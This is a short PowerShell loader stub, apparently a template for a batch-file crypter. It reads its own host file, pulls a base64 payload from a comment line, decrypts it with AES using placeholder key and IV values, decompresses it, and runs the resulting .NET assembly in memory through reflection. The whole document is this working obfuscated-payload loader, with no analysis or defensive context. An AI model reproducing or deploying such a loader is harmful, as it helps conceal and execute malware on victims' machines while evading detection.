﻿$contents_var = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);
foreach ($line_var in $contents_var) { if ($line_var.StartsWith(':: ')) {  $lastline_var = $line_var.Substring(3); break; }; };
$payload_var = [System.Convert]::FromBase64String($lastline_var);
$aes_var = New-Object System.Security.Cryptography.AesManaged;
$aes_var.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$aes_var.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$aes_var.Key = [System.Convert]::FromBase64String('DECRYPTION_KEY');
$aes_var.IV = [System.Convert]::FromBase64String('DECRYPTION_IV');
$decryptor_var = $aes_var.CreateDecryptor();
$payload_var = $decryptor_var.TransformFinalBlock($payload_var, 0, $payload_var.Length);
$decryptor_var.Dispose();
$aes_var.Dispose();
$msi_var = New-Object System.IO.MemoryStream(, $payload_var);
$mso_var = New-Object System.IO.MemoryStream;
$gs_var = New-Object System.IO.Compression.GZipStream($msi_var, [IO.Compression.CompressionMode]::Decompress);
$gs_var.CopyTo($mso_var);
$gs_var.Dispose();
$msi_var.Dispose();
$mso_var.Dispose();
$payload_var = $mso_var.ToArray();
[System.Reflection.Assembly]::Load($payload_var).EntryPoint.Invoke($null, (, [string[]] ('%*')))